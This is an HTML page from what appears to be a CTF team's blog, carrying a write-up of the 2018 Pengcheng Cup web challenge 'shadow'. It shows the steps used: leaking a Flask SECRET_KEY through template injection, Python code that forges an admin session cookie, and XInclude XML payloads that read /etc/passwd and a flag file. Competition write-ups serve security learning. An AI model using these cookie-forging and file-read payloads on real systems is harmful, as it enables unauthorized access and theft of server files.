@@ -1,0 +1,192 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>鹏城杯2018WEB shadow题解 | kn0ck&#39;s blog | 一群CTF爱好者</title>
+
+  
+  <meta name="author" content="kn0ck Team">
+  
+
+  
+  <meta name="description" content="kn0ck战队成立于2017年9月，是由一群来自全国各地的网络爱好者组成，战队成员因兴趣与热爱而聚集，以不服输的精神全力向着梦想进发。作为一支新兴CTF队伍，战队的宗旨是通过实际比赛将理论知识更好的发挥，以赛代练，锻炼和提升个人的技术水平，在比赛中广交朋友，共同进步。">
+  
+
+  
+  <meta name="keywords" content="CTF,kn0ck,网络安全,web,pwn,夺旗赛">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="鹏城杯2018WEB shadow题解">
+
+  <meta property="og:site_name" content="kn0ck&#39;s blog">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="kn0ck&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">kn0ck&#39;s blog</a>
+    </h1>
+    <p class="site-description">一群CTF爱好者</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/about">关于</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>鹏城杯2018WEB shadow题解</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/02/12/2018-pcb-shadow/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-02-12T15:30:43.000Z">
+          2019-02-12
+        </time>
+      </a>
+    </span>
+    
+    <span class="posted-on">
+      <a href="/2019/02/12/2018-pcb-shadow/" rel="bookmark">
+        
+          huasir
+        
+
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天打完了鹏城杯，还是一脸懵逼，主办方疯狂放提示，选手疯狂懵逼。。。<br>我在一堆脑洞题之间还是看到了一道比较有意思的web题目，虽然最后也没出flag，但还是挺有感悟的。<br><a id="more"></a></p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给你一个flask搭建的网站，除了登录注册之外也没发现什么功能， 注释里看到有<code>/upload</code>路径，但访问提示需要admin权限。又四处游荡发现几个js不存在，回显是：</p>
+<p><img src="https://img.5am3.com/20190212154998561366780.png" alt="20190212154998561366780.png"></p>
+<p>看到这里，应该是有404页面的SSTI漏洞了，但是试了几次发现无法直接命令执行，只好寻求来读一些内置变量，<code>config</code>和<code>self</code>都被禁了，读了<a href="https://blog.csdn.net/qq_33020901/article/details/83036927" target="_blank" rel="noopener">这位大佬的文章</a>。可知，可以通过<code>    </code>读到一些变量，其中<code></code>可以读到<code>SECRET_KEY</code></p>
+<p><img src="https://img.5am3.com/20190212154998565995974.png" alt="20190212154998565995974.png"></p>
+<p>这样我们就可以来伪造flask的cookie，获得admin权限了。通过访问<code></code>拿到cookie</p>
+<p><img src="https://img.5am3.com/2019021215499856735385.png" alt="2019021215499856735385.png"></p>
+<p>拆开看看里面有啥</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=URLSafeTimedSerializer(<span class="string">"as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf"</span>, salt=<span class="string">"cookie-session"</span>,signer_kwargs=&#123;<span class="string">"key_derivation"</span>:<span class="string">"hmac"</span>,<span class="string">"digest_method"</span>:<span class="string">"sha1"</span>&#125;)</span><br><span class="line">data = s.loads(<span class="string">".eJw9kMFqg0AQhl-l7DkHXdNLIAfLWjGwI8oamb2INabu6qagkTQb8u4dcuhhYGDm-4b5H6w5z_0ysN25nZZ-wxpzYrsHe_tiOwa8uqHPPPqRqrgh1xZsctOqo07e0RaRdhjlabXN68yDxUCKg9G2irQaJu3KSdZILO2rOJQeRiQO0iLE-jiiS361jQPpjg55cUdOM5eF2sGQK-m1-L6jAqcFeilKA-Iw0H2PPOE6xQgUjFrJAES1Z88N65b53Fx_xv7y_wKhIaRVBOLToC1HwsNcfEySVxxIq9PSguhCmSYB1EkgbbaV8f6lM0vTnpwh2XVeKZpL63pSDmu7mJlt2Lr08ysu9s6ef3KlazU.XAOwLQ.q-Gin27oj8k69vvulgiayMpFKJs"</span>)</span><br><span class="line"><span class="keyword">print</span> (data)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.5am3.com/20190212154998569398968.png" alt="20190212154998569398968.png"></p>
+<p>可以看到这里<code>is_admin</code>是<code>False</code>,改成<code>True</code>再打包起来就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = s.dumps(&#123;<span class="string">'_fresh'</span>: <span class="keyword">True</span>, <span class="string">'_id'</span>: &#123;<span class="string">' b'</span>: <span class="string">'ZTM3ODI5NTdjYTIxN2I0YzU5ZjgzNjBmZjgwMDE5YzM3ODI0MzZhOTkwNzdmOWIyOTAzMWU5YzkxZDNmYmM5MGQyM2M4N2FkZDQ2NThlZmUyNzA5ZTUwMGVmZDI2NDE5ODZlM2NjNWQ0NmY5NmRlNTQwYjg2MmY0ZTgwYjBiNTI='</span>&#125;, <span class="string">'csrf_token'</span>: &#123;<span class="string">' b'</span>: <span class="string">'NWFkNmQ2OTgwZmU5ZGMyNWYxMTdiNzBhZDBiMTIxNjcxYjllZWM1Yw=='</span>&#125;, <span class="string">'is_admin'</span>: <span class="keyword">True</span>, <span class="string">'name'</span>: <span class="string">'huasir'</span>, <span class="string">'user_id'</span>: <span class="string">'5'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></p>
+<p>拿着这个去访问upload，然后可以上传文件。当然python直接上传貌似不能拿shell，试了几次发现上传XML文件有回显，但是上传常见的XXE payload会显示错误。</p>
+<p><img src="https://img.5am3.com/20190212154998571710950.png" alt="20190212154998571710950.png"></p>
+<p>参考<a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">这篇文章</a>可以看到用XInclude可以避开使用<code>ENTITY</code>关键字：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>回显<code>/etc/passwd</code>内容</p>
+<p><img src="https://img.5am3.com/20190212154998573865102.png" alt="20190212154998573865102.png"></p>
+<p>看到有个rq用户也有<code>bash</code>,读取其用户目录下的<code>.bash_history</code>可以看到flag文件的名字，遂构造payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/rq/f123333333ag"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>flag:<br><img src="https://img.5am3.com/20190212154998575010135.png" alt="20190212154998575010135.png"></p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>一开始我失败的原因是我想用flask服务来得到cookie：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, escape, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello, &#123;&#125;\ncookie: &#123;&#125;'</span>.format(escape(session[<span class="string">'name'</span>]),request.cookies)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello, stranger\n'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">	session[<span class="string">'csrf_token'</span>] = <span class="string">'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'</span></span><br><span class="line">    session[<span class="string">'_id'</span>] = <span class="string">'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'</span></span><br><span class="line">    session[<span class="string">'user_id'</span>] = <span class="string">'1'</span></span><br><span class="line">    session[<span class="string">'name'</span>] = <span class="string">'admin'</span></span><br><span class="line">    session[<span class="string">'is_admin'</span>] = <span class="keyword">True</span></span><br><span class="line">    session[<span class="string">'_fresh'</span>] = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login success"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>, debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
+<p>但是这样的cookie能进入/upload页面，但是一传文件就又反馈<code>only admin can use it</code>，结束后我又试了两次，又行了?_?….蜜汁，这样应该是没有影响的。<br>可能是因为我把flask服务改到一个页面里了？？/px<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'csrf_token'</span>] = <span class="string">'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'</span></span><br><span class="line">    session[<span class="string">'_id'</span>] = <span class="string">'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'</span></span><br><span class="line">    session[<span class="string">'user_id'</span>] = <span class="string">'5'</span></span><br><span class="line">    session[<span class="string">'name'</span>] = <span class="string">'huasir'</span></span><br><span class="line">    session[<span class="string">'is_admin'</span>] = <span class="keyword">True</span></span><br><span class="line">    session[<span class="string">'_fresh'</span>] = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello, &#123;&#125;\ncookie: &#123;&#125;'</span>.format(escape(session[<span class="string">'name'</span>]),request.cookies)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello, stranger\n'</span></span><br></pre></td></tr></table></figure></p>
+<p>python2和python3起服务虽然结果不同，但都能用。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/web/">web</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/flask/">flask</a>
+    </span>
+    
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+	<section id="comment" class="comment">
+		<div id="vcomments"></div>
+	</section>
+	<!-- LeanCloud -->
+	<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.10.0/dist/av-min.js"></script>
+	<!-- Valine -->
+	<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+	<script>
+		new Valine({
+			el: '#vcomments',
+			appId: '86EMltAutxkr1IaqhOo0dP7l-gzGzoHsz',
+			appKey: 'kdJzexN5shKVeTpQx49IQDaH'
+		})
+	</script>
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 kn0ck Team
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
